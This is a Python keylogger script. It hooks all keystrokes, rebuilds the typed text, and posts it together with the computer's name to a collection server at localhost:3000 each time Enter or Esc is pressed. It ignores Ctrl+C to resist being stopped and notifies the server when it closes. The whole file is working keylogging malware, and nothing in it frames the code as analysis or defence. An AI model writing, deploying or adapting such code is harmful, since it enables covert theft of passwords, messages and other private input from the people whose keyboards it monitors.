import os
import uuid
import time
import requests
import keyboard
import threading

# =========================
# CONFIG
# =========================
url = "http://localhost:3000/"
script_dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(script_dir, "userId.txt")

userId = ""
isRunning = False

# =========================
# KEYBOARD HANDLER
# =========================
text_buffer = ""
shift_pressed = False
caps_pressed = False

SHIFT_MAP = {
    "1": "!",
    "2": "@",
    "3": "#",
    "4": "$",
    "5": "%",
    "6": "^",
    "7": "&",
    "8": "*",
    "9": "(",
    "0": ")",
    "-": "_",
    "=": "+",
    "[": "{",
    "]": "}",
    ";": ":",
    "'": '"',
    ",": "<",
    ".": ">",
    "/": "?",
    "\\": "|",
    "`": "~",
}


def process_character(char):
    global shift_pressed, caps_pressed
    if char.isalpha():
        return char.upper() if shift_pressed ^ caps_pressed else char.lower()
    if shift_pressed and char in SHIFT_MAP:
        return SHIFT_MAP[char]
    return char


def on_key(event):
    global shift_pressed, caps_pressed, text_buffer, isRunning, userId

    if event.name == "shift":
        shift_pressed = event.event_type == "down"
        return

    if event.name == "caps lock" and event.event_type == "down":
        caps_pressed = not caps_pressed
        return

    if event.event_type != "down":
        return

    if event.name == "space":
        text_buffer += " "
        return

    if event.name == "backspace":
        text_buffer = text_buffer[:-1]
        return

    if event.name == "enter":
        try:
            requests.post(url, json={"userId": userId, "keylog": text_buffer})
        finally:
            text_buffer = ""
        return

    if len(event.name) == 1:
        text_buffer += process_character(event.name)
        return

    if event.name == "esc":
        if text_buffer:
            try:
                requests.post(url, json={"userId": userId, "keylog": text_buffer})
            finally:
                text_buffer = ""
        isRunning = False
        keyboard.unhook_all()
        print("ESC pressed. Exiting gracefully.")
        return


# =========================
# MAIN
# =========================
def main():
    global isRunning, userId

    # Ensure userId file exists before starting hook
    userId = os.environ.get("COMPUTERNAME")

    print("userId:", userId)

    # Start keyboard hook
    try:
        keyboard.hook(on_key)
    except Exception as e:
        print("Failed to initialize keyboard hook:", e)
        return

    isRunning = True

    # Run a loop that ignores KeyboardInterrupt
    while isRunning:
        try:
            time.sleep(0.1)
        except KeyboardInterrupt:
            # Ignore Ctrl+C
            continue

    # Notify server about closing
    try:
        requests.post(url, json={"userId": userId, "type": "close"})
    except:
        pass
    keyboard.unhook_all()
    print("Program terminated gracefully.")


if __name__ == "__main__":
    main()
